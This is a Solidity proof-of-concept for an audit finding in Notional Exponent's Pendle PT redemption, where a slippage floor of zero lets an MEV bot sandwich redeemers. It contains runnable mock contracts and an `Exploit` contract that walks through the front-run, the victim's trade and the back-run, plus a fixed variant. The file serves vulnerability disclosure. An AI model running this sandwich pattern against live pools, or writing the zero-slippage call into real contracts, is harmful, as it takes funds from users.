// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Notional Exponent H-11 — expired-PT redemption calls sy.redeem with
//  minTokenOut = 0 (no slippage protection)
//  (sherlock 2025-06-notional-exponent, src/staking/PendlePTLib.sol L87).
//
//  `redeemExpiredPT` burns the expired PT for SY, then converts SY to the exit
//  token via `sy.redeem(..., minTokenOut: 0, ...)`. Many SY contracts route that
//  conversion through an external DEX. With a zero floor, a redeemer's swap has
//  no protection: an MEV bot can sandwich it — front-run to skew the pool,
//  let the victim redeem at the bad rate, and back-run to capture the shortfall.
//
//  `redeemExpiredPT` is reproduced VERBATIM (marked @>); the SY, YT, PT, a
//  constant-product DEX pool, and the tokens are faithful minimal doubles.
//  Local deploy, no fork.
// =============================================================================

contract MiniToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Constant-product SY/OUT pool (x*y=k). Real token custody.
contract Pool {
    MiniToken public immutable sy;
    MiniToken public immutable out;
    uint256 public rSy;
    uint256 public rOut;

    constructor(MiniToken _sy, MiniToken _out, uint256 s, uint256 o) {
        sy = _sy;
        out = _out;
        rSy = s;
        rOut = o;
    }

    // Sell `syIn` SY for OUT. Caller must approve this pool for SY.
    function sellSy(uint256 syIn) external returns (uint256 outAmt) {
        sy.transferFrom(msg.sender, address(this), syIn);
        uint256 k = rSy * rOut;
        uint256 newSy = rSy + syIn;
        outAmt = rOut - k / newSy;
        rSy = newSy;
        rOut = rOut - outAmt;
        out.transfer(msg.sender, outAmt);
    }

    // Sell `outIn` OUT for SY. Caller must approve this pool for OUT.
    function sellOut(uint256 outIn) external returns (uint256 syAmt) {
        out.transferFrom(msg.sender, address(this), outIn);
        uint256 k = rSy * rOut;
        uint256 newOut = rOut + outIn;
        syAmt = rSy - k / newOut;
        rOut = newOut;
        rSy = rSy - syAmt;
        sy.transfer(msg.sender, syAmt);
    }
}

// IStandardizedYield double — redeem routes SY→OUT through the DEX pool.
contract SY {
    MiniToken public immutable syToken;
    MiniToken public immutable outToken;
    Pool public immutable pool;

    constructor(MiniToken _sy, MiniToken _out, Pool _pool) {
        syToken = _sy;
        outToken = _out;
        pool = _pool;
    }

    // Convert netSyOut SY (held by this contract) to outToken via the pool.
    // minTokenOut is the slippage floor; with 0 there is NO protection.
    function redeem(address receiver, uint256 netSyOut, address, /*tokenOut*/ uint256 minTokenOut, bool /*burn*/ )
        external
        returns (uint256 amountTokenOut)
    {
        syToken.approve(address(pool), netSyOut);
        amountTokenOut = pool.sellSy(netSyOut);
        require(amountTokenOut >= minTokenOut, "SY: insufficient out"); // minTokenOut=0 → never reverts
        outToken.transfer(receiver, amountTokenOut);
    }
}

// IPYieldToken double — redeemPY burns the received PT and mints SY to the SY contract.
contract YT {
    MiniToken public immutable ptToken;
    MiniToken public immutable syToken;

    constructor(MiniToken _pt, MiniToken _sy) {
        ptToken = _pt;
        syToken = _sy;
    }

    function redeemPY(address syAddr) external returns (uint256 netSyOut) {
        netSyOut = ptToken.balanceOf(address(this)); // PT transferred in by redeemExpiredPT
        syToken.mint(syAddr, netSyOut); // 1 PT : 1 SY
    }
}

/*//////////////////////////////////////////////////////////////
   PendlePTLib — VULNERABLE. redeemExpiredPT converts SY→exit
   token with minTokenOut hardcoded to 0.
//////////////////////////////////////////////////////////////*/
contract PendlePTLib {
    function redeemExpiredPT(MiniToken pt, YT yt, SY sy, address tokenOutSy, uint256 netPtIn)
        external
        returns (uint256 netTokenOut)
    {
        // PT Tokens are known to be ERC20 compliant
        pt.transfer(address(yt), netPtIn);
        uint256 netSyOut = yt.redeemPY(address(sy));
        // @> no slippage protection: minTokenOut = 0
        netTokenOut = sy.redeem(address(this), netSyOut, tokenOutSy, 0, true);
    }

    // Mitigation: accept and pass through a minTokenOut floor.
    function redeemExpiredPTFixed(MiniToken pt, YT yt, SY sy, address tokenOutSy, uint256 netPtIn, uint256 minTokenOut)
        external
        returns (uint256 netTokenOut)
    {
        pt.transfer(address(yt), netPtIn);
        uint256 netSyOut = yt.redeemPY(address(sy));
        netTokenOut = sy.redeem(address(this), netSyOut, tokenOutSy, minTokenOut, true);
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — an MEV bot sandwiches the expired-PT redemption:
   front-run skews the pool, the victim redeems with minTokenOut=0
   at the bad rate, back-run captures the shortfall.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // user-loss sink

    uint256 internal constant R_SY = 100_000 ether; // pool SY reserve
    uint256 internal constant R_OUT = 100_000 ether; // pool OUT reserve
    uint256 internal constant NET_PT = 1_000 ether; // victim's expired PT
    uint256 internal constant FRONTRUN_SY = 100_000 ether; // attacker front-run size

    MiniToken public syToken;
    MiniToken public outToken;
    MiniToken public pt;
    Pool public pool;
    SY public sy;
    YT public yt;
    PendlePTLib public lib;
    MiniToken public lossMarker;

    uint256 public fairOut; // OUT the victim would get with no sandwich
    uint256 public victimOut; // OUT the victim actually gets (sandwiched, minTokenOut=0)
    uint256 public attackerSyProfit;

    function run() external payable {
        syToken = new MiniToken("SY");
        outToken = new MiniToken("sUSDe");
        pt = new MiniToken("PT");
        pool = new Pool(syToken, outToken, R_SY, R_OUT);
        sy = new SY(syToken, outToken, pool);
        yt = new YT(pt, syToken);
        lib = new PendlePTLib();
        lossMarker = new MiniToken("LOSS-sUSDe");

        // Seed the pool with real reserves.
        syToken.mint(address(pool), R_SY);
        outToken.mint(address(pool), R_OUT);

        // Fair reference: what the victim's NET_PT SY would fetch with no sandwich.
        fairOut = R_OUT - (R_SY * R_OUT) / (R_SY + NET_PT);

        // --- Attacker front-run: dump SY to skew the price against the victim ---
        syToken.mint(address(this), FRONTRUN_SY);
        syToken.approve(address(pool), type(uint256).max);
        uint256 frontOut = pool.sellSy(FRONTRUN_SY);

        // --- Victim redeems the expired PT (minTokenOut = 0) at the skewed rate ---
        pt.mint(address(lib), NET_PT); // victim's PT routed through the lib
        victimOut = lib.redeemExpiredPT(pt, yt, sy, address(outToken), NET_PT);

        // --- Attacker back-run: sell the OUT back for SY, capturing the shortfall ---
        outToken.approve(address(pool), type(uint256).max);
        uint256 syBack = pool.sellOut(frontOut);
        attackerSyProfit = syBack - FRONTRUN_SY;

        // The victim's OUT shortfall (fair - actual) is the direct user fund loss.
        lossMarker.mint(SINK, fairOut - victimOut);
    }
}
